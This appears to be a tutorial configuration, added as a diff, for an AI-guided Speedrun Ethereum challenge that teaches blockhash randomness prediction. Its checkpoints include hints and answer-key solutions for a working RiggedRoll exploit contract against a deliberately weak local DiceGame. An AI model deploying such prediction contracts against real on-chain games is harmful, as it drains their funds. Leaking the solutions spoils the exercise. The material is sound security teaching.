@@ -1,0 +1,490 @@
+name: "Dice Game"
+version: "1.0"
+description: "Exploit weak on-chain randomness by building a RiggedRoll contract that predicts DiceGame's block-hash-based random numbers"
+difficulty: "beginner"
+estimated_time: "2 - 6 hours"
+
+setup:
+  file: "packages/hardhat/contracts/RiggedRoll.sol"
+
+welcome_message: |
+  Welcome to the Dice Game Challenge!
+
+  You'll build a **RiggedRoll** contract that exploits a vulnerability in on-chain randomness. The `DiceGame` contract uses `blockhash` to generate "random" numbers — but since everything on-chain is public, you can **predict** the outcome before rolling.
+
+  You'll learn:
+  1. How `receive()` lets contracts accept ETH
+  2. How block hash "randomness" can be predicted by another contract
+  3. How `Ownable` access control protects sensitive functions
+
+  **Before we start, open separate terminal windows** (not this one!) and run:
+
+  1. Start your local blockchain:
+     ```
+     yarn chain
+     ```
+  2. In another terminal, deploy the contracts:
+     ```
+     yarn deploy
+     ```
+  3. In another terminal, start the frontend:
+     ```
+     yarn start
+     ```
+  4. Open http://localhost:3000 in your browser.
+
+  > These commands run continuously, so each needs its own terminal window.
+
+  **How this works:**
+  - I'll teach you a concept, then give you a coding task
+  - You write the code in your editor, then say **"check"** and I'll run the tests
+  - Say **"hint"** anytime you're stuck — hints get progressively more specific
+  - Use **`/skip`** if you want me to write the code and explain it
+
+  > Re-run `yarn deploy --reset` whenever you want to redeploy with a fresh contract address.
+
+  Your progress is saved automatically. Use `/start` to resume anytime.
+
+  Let's rig this game!
+
+checkpoints:
+  # ============================================================
+  # CHECKPOINT 1: Receiving ETH
+  # ============================================================
+  - id: "receive-eth"
+    title: "Receiving ETH"
+    description: "Add a receive() function so the contract can accept ETH transfers"
+
+    context: |
+      ## How Contracts Receive ETH
+
+      By default, smart contracts **cannot** receive ETH. If someone tries to send ETH to a contract without a `receive()` function, the transaction reverts.
+
+      The `receive()` function is a special Solidity function that gets called when a contract receives plain ETH (no calldata):
+
+      ```solidity
+      receive() external payable {}
+      ```
+
+      Key points:
+      - **`external`** — can only be called from outside the contract
+      - **`payable`** — allows the function to accept ETH
+      - **No `function` keyword** — it's a special function, like `constructor`
+      - **No arguments, no return** — it just needs to exist
+      - The body can be empty `{}` — just having it declared is enough
+
+      ### Why does RiggedRoll need this?
+
+      Look at `DiceGame.sol` — when you win (roll <= 5), the DiceGame sends the prize ETH to `msg.sender`:
+
+      ```solidity
+      (bool sent, ) = msg.sender.call{value: amount}("");
+      require(sent, "Failed to send Ether");
+      ```
+
+      Since `RiggedRoll` will be calling `rollTheDice()`, `msg.sender` inside DiceGame will be the RiggedRoll contract address. Without `receive()`, the prize transfer would fail and the whole transaction would revert — even on a winning roll!
+
+      We also need `receive()` to fund the contract with ETH for rolling (each roll costs 0.002 ETH).
+
+    questions:
+      - text: "Why would the DiceGame prize transfer fail if RiggedRoll didn't have a receive() function?"
+        concepts:
+          [
+            "revert",
+            "reject",
+            "cannot receive",
+            "no receive",
+            "msg.sender",
+            "contract",
+            "call",
+            "payable",
+          ]
+        hint: "When DiceGame sends prize ETH, the recipient is the RiggedRoll contract. What happens when you send ETH to a contract that can't accept it?"
+
+    task:
+      description: |
+        But first — let's explore the DiceGame contract in the frontend:
+
+        1. Open http://localhost:3000 — you should see the **Dice Game** page.
+        2. Grab some funds from the **Faucet** (bottom-left of the page).
+        3. Roll the dice a few times! Watch what happens.
+        4. Go to the **Debug Contracts** tab and inspect the `DiceGame` contract — check its balance. It increases on a failed roll and decreases by the prize amount on a successful roll.
+
+        Now, open `packages/hardhat/contracts/RiggedRoll.sol`.
+
+        Add a `receive()` function at the bottom of the contract so it can accept incoming ETH:
+
+        ```solidity
+        receive() external payable {}
+        ```
+
+        This enables two things:
+        1. We can fund RiggedRoll with ETH for rolling
+        2. DiceGame can send prize ETH back to RiggedRoll when we win
+
+        Say **"check"** when you're ready!
+      file: "packages/hardhat/contracts/RiggedRoll.sol"
+      test: "yarn test --grep 'Checkpoint1'"
+      hints:
+        - "Add `receive() external payable {}` as the last function in the contract. Note: no `function` keyword needed."
+        - |
+          ```solidity
+          receive() external payable {}
+          ```
+        - |
+          Full contract with receive():
+          ```solidity
+          contract RiggedRoll is Ownable {
+              DiceGame public diceGame;
+
+              constructor(address payable diceGameAddress) Ownable(msg.sender) {
+                  diceGame = DiceGame(diceGameAddress);
+              }
+
+              // ... other functions ...
+
+              receive() external payable {}
+          }
+          ```
+      solution: |
+        receive() external payable {}
+
+  # ============================================================
+  # CHECKPOINT 2: Predicting Randomness
+  # ============================================================
+  - id: "rigged-roll"
+    title: "Predicting Randomness"
+    description: "Implement riggedRoll() to predict the dice outcome and only roll when guaranteed to win"
+
+    context: |
+      ## The Vulnerability: Predictable "Randomness"
+
+      Look at how `DiceGame.rollTheDice()` generates its "random" number:
+
+      ```solidity
+      bytes32 prevHash = blockhash(block.number - 1);
+      bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
+      uint256 roll = uint256(hash) % 16;
+      ```
+
+      This looks random, but **every input is public**:
+      - `blockhash(block.number - 1)` — the previous block's hash, readable by any contract
+      - `address(this)` — the DiceGame contract address, publicly known
+      - `nonce` — a public state variable on DiceGame
+
+      ### The Key Insight
+
+      When RiggedRoll calls DiceGame in the **same transaction**, they share the same block. So RiggedRoll can compute the exact same hash **before** calling `rollTheDice()`:
+
+      ```solidity
+      bytes32 prevHash = blockhash(block.number - 1);
+      bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+      uint256 roll = uint256(hash) % 16;
+      ```
+
+      If `roll > 5`, we simply **revert** instead of wasting ETH on a losing roll. If `roll <= 5`, we call `rollTheDice()` knowing we'll win!
+
+      ### Sending ETH with a Contract Call
+
+      `rollTheDice()` is `payable` and requires at least 0.002 ETH. To send ETH when calling another contract:
+
+      ```solidity
+      diceGame.rollTheDice{value: 0.002 ether}();
+      ```
+
+      The `{value: ...}` syntax attaches ETH to the function call. The ETH comes from RiggedRoll's balance.
+
+      ### Custom Errors
+
+      Instead of using `require` with string messages, Solidity supports **custom errors** which are more gas-efficient and descriptive:
+
+      ```solidity
+      error NotEnoughETH(uint256 required, uint256 available);
+      error NotWinningRoll(uint256 roll);
+      ```
+
+      You revert with them using `if` + `revert`:
+
+      ```solidity
+      if (condition) revert NotEnoughETH(required, available);
+      ```
+
+      ### Balance Check
+
+      Before rolling, verify that RiggedRoll has enough ETH:
+
+      ```solidity
+      uint256 required = 0.002 ether;
+      uint256 available = address(this).balance;
+      if (available < required) revert NotEnoughETH(required, available);
+      ```
+
+      `address(this).balance` returns the contract's current ETH balance.
+
+      ### Why This Matters
+
+      This is why **block hash is not a secure source of randomness**. For real randomness on-chain, projects use oracles like [Chainlink VRF](https://docs.chain.link/vrf) which provide verifiable random numbers from off-chain sources.
+
+    questions:
+      - text: "Why can RiggedRoll predict DiceGame's 'random' number? What makes this possible?"
+        concepts:
+          [
+            "same block",
+            "same transaction",
+            "public",
+            "blockhash",
+            "nonce",
+            "on-chain",
+            "deterministic",
+            "predictable",
+            "replicate",
+            "compute",
+          ]
+        hint: "Think about what inputs DiceGame uses to generate its random number. Are any of those inputs secret?"
+
+    task:
+      description: |
+        Open `packages/hardhat/contracts/RiggedRoll.sol`.
+
+        First, add these custom errors to the error section in `RiggedRoll.sol`:
+
+        ```solidity
+        error NotEnoughETH(uint256 required, uint256 available);
+        error NotWinningRoll(uint256 roll);
+        ```
+
+        Then implement `riggedRoll()`:
+
+        1. **Check balance** — revert with `NotEnoughETH` if less than 0.002 ether
+        2. **Predict the roll** — replicate DiceGame's hash calculation:
+           ```solidity
+           bytes32 prevHash = blockhash(block.number - 1);
+           bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+           uint256 roll = uint256(hash) % 16;
+           ```
+        3. **Only roll if winning** — revert with `NotWinningRoll` if `roll > 5`
+        4. **Call DiceGame** — `diceGame.rollTheDice{value: 0.002 ether}();`
+
+        ### Deploy & try it out
+
+        After writing the code:
+
+        1. **Deploy script**: Uncomment the deploy block in `packages/hardhat/deploy/01_deploy_riggedRoll.ts` (the `await deploy("RiggedRoll", ...)` section).
+        2. Run `yarn deploy --reset` to deploy your RiggedRoll contract.
+        3. Send funds to RiggedRoll using the **Faucet** (bottom-left) — you need at least 0.002 ETH.
+        4. Go to the **Debug Contracts** tab and try calling `riggedRoll` on the `RiggedRoll` contract.
+        5. It will likely revert with `NotWinningRoll` — that's expected! It only succeeds when the predicted roll is a winner. Try a few times.
+        6. **Side quest**: Uncomment the `Rigged Roll!` button in `packages/nextjs/app/dice/page.tsx` so you can test from the main UI without switching tabs.
+
+        Say **"check"** when you're ready!
+      file: "packages/hardhat/contracts/RiggedRoll.sol"
+      test: "yarn test --grep 'Checkpoint2'"
+      hints:
+        - "Start with a balance check using `if (available < required) revert NotEnoughETH(required, available);`, then compute the hash exactly like DiceGame does."
+        - |
+          The hash computation must match DiceGame exactly:
+          ```solidity
+          bytes32 prevHash = blockhash(block.number - 1);
+          bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+          uint256 roll = uint256(hash) % 16;
+          ```
+        - |
+          Full function:
+          ```solidity
+          function riggedRoll() external {
+              uint256 required = 0.002 ether;
+              uint256 available = address(this).balance;
+              if (available < required) revert NotEnoughETH(required, available);
+
+              bytes32 prevHash = blockhash(block.number - 1);
+              uint256 nonce = diceGame.nonce();
+              bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
+              uint256 roll = uint256(hash) % 16;
+
+              if (roll > 5) revert NotWinningRoll(roll);
+
+              diceGame.rollTheDice{value: required}();
+          }
+          ```
+      solution: |
+        function riggedRoll() external {
+            uint256 required = 0.002 ether;
+            uint256 available = address(this).balance;
+            if (available < required) revert NotEnoughETH(required, available);
+
+            bytes32 prevHash = blockhash(block.number - 1);
+            uint256 nonce = diceGame.nonce();
+            bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
+            uint256 roll = uint256(hash) % 16;
+
+            if (roll > 5) revert NotWinningRoll(roll);
+
+            diceGame.rollTheDice{value: required}();
+        }
+
+  # ============================================================
+  # CHECKPOINT 3: Withdrawing Funds
+  # ============================================================
+  - id: "withdraw"
+    title: "Withdrawing Funds"
+    description: "Implement withdraw() with onlyOwner access control to extract winnings"
+
+    context: |
+      ## Access Control with Ownable
+
+      When RiggedRoll wins, prize ETH accumulates in the contract. We need a `withdraw()` function — but only the **owner** should be able to call it.
+
+      The contract already inherits from OpenZeppelin's `Ownable`:
+
+      ```solidity
+      import "@openzeppelin/contracts/access/Ownable.sol";
+
+      contract RiggedRoll is Ownable {
+          constructor(address payable diceGameAddress) Ownable(msg.sender) {
+      ```
+
+      `Ownable(msg.sender)` sets the deployer as the initial owner. This gives us:
+      - `owner()` — returns the current owner address
+      - `onlyOwner` modifier — restricts a function to just the owner
+      - `transferOwnership(newOwner)` — transfers ownership
+
+      ### The `onlyOwner` Modifier
+
+      When you add `onlyOwner` to a function, it automatically checks that `msg.sender == owner()` and reverts with `OwnableUnauthorizedAccount` if not:
+
+      ```solidity
+      function withdraw(address _addr, uint256 _amount) public onlyOwner {
+          // only the owner can reach this code
+      }
+      ```
+
+      ### Balance Check with Custom Error
+
+      Before withdrawing, verify the contract has enough ETH. Add a custom error:
+
+      ```solidity
+      error InsufficientBalance(uint256 requested, uint256 available);
+      ```
+
+      Then check before sending:
+
+      ```solidity
+      uint256 available = address(this).balance;
+      if (_amount > available) revert InsufficientBalance(_amount, available);
+      ```
+
+      ### Sending ETH with `call`
+
+      To send a specific amount of ETH to an address:
+
+      ```solidity
+      (bool success, ) = payable(_addr).call{value: _amount}("");
+      require(success, "Withdraw failed");
+      ```
+
+      - `_addr.call{value: _amount}("")` — sends `_amount` wei to `_addr`
+      - Returns a boolean indicating success
+      - Always check the return value!
+
+      ### Why not `transfer()`?
+
+      The older `.transfer()` method forwards only 2300 gas, which can break smart contract wallets. `.call{value: ...}("")` forwards all available gas and is the recommended pattern.
+
+    questions:
+      - text: "What would happen if withdraw() didn't have the onlyOwner modifier? Why is access control important here?"
+        concepts:
+          [
+            "anyone",
+            "drain",
+            "steal",
+            "take",
+            "permission",
+            "restrict",
+            "only owner",
+            "unauthorized",
+          ]
+        hint: "Without restrictions, any address could call withdraw(). What would a malicious user do?"
+
+    task:
+      description: |
+        You've beaten the game — but where's your money? Since RiggedRoll calls `rollTheDice()`, the prize ETH gets sent to the RiggedRoll contract, not to you. You need a `withdraw()` function to extract it.
+
+        Open `packages/hardhat/contracts/RiggedRoll.sol`.
+
+        First, add this custom error to the error section:
+
+        ```solidity
+        error InsufficientBalance(uint256 requested, uint256 available);
+        ```
+
+        Then implement `withdraw(address _addr, uint256 _amount)` with `onlyOwner`:
+
+        1. **Check balance** — revert with `InsufficientBalance` if `_amount` exceeds the contract balance
+        2. **Send ETH** — send `_amount` to `_addr` using `call`
+        3. **Check success** — require that the transfer succeeded
+
+        ### Deploy & try it out
+
+        After writing the code:
+
+        1. **Set yourself as owner**: In `packages/hardhat/deploy/01_deploy_riggedRoll.ts`, uncomment the `transferOwnership` block and replace `"Your Address"` with your frontend wallet address. This lets your frontend address call `withdraw()`.
+        2. Run `yarn deploy --reset` to deploy your updated contracts.
+        3. Go to the **Debug Contracts** tab — verify your frontend address is the `owner` of RiggedRoll (call `owner()`).
+        4. Fund RiggedRoll via Faucet, then call `riggedRoll` a few times until you win.
+        5. Call `withdraw()` to send the winnings to your address — check that your balance increases!
+
+        Say **"check"** when you're ready!
+      file: "packages/hardhat/contracts/RiggedRoll.sol"
+      test: "yarn test --grep 'Checkpoint3'"
+      hints:
+        - "The function signature is `function withdraw(address _addr, uint256 _amount) external onlyOwner`. Check balance first, then use `.call{value: _amount}` to send ETH."
+        - |
+          ```solidity
+          uint256 available = address(this).balance;
+          if (_amount > available) revert InsufficientBalance(_amount, available);
+          (bool success, ) = payable(_addr).call{value: _amount}("");
+          require(success, "Withdraw failed");
+          ```
+        - |
+          Full function:
+          ```solidity
+          function withdraw(address _addr, uint256 _amount) external onlyOwner {
+              uint256 available = address(this).balance;
+              if (_amount > available) revert InsufficientBalance(_amount, available);
+              (bool success, ) = payable(_addr).call{value: _amount}("");
+              require(success, "Withdraw failed");
+          }
+          ```
+      solution: |
+        function withdraw(address _addr, uint256 _amount) external onlyOwner {
+            uint256 available = address(this).balance;
+            if (_amount > available) revert InsufficientBalance(_amount, available);
+            (bool success, ) = payable(_addr).call{value: _amount}("");
+            require(success, "Withdraw failed");
+        }
+
+completion_message: |
+  Congratulations — you've completed the Dice Game Challenge!
+
+  Your RiggedRoll contract can now:
+  - **Receive ETH** via a `receive()` function
+  - **Predict "random" outcomes** by replicating DiceGame's hash calculation
+  - **Only roll when winning** by reverting on unfavorable outcomes
+  - **Withdraw winnings** with owner-only access control
+
+  Key concepts you learned:
+  - `receive()` function for accepting ETH transfers
+  - Why `blockhash` is NOT secure randomness (everything on-chain is public)
+  - Same-transaction attacks — contracts in the same tx share the same block context
+  - `Ownable` access control pattern
+  - Sending ETH safely with `call{value: ...}`
+
+  **The big takeaway:** Never use on-chain data (block hash, timestamp, etc.) as a source of randomness. Use an oracle like Chainlink VRF for secure randomness.
+
+  ## Next Steps
+
+  To submit your challenge, complete the remaining checkpoints on the
+  [Speedrun Ethereum challenge page](https://speedrunethereum.com/challenge/dice-game):
+  - Deploy your contract
+  - Ship your frontend
+  - Verify your contract
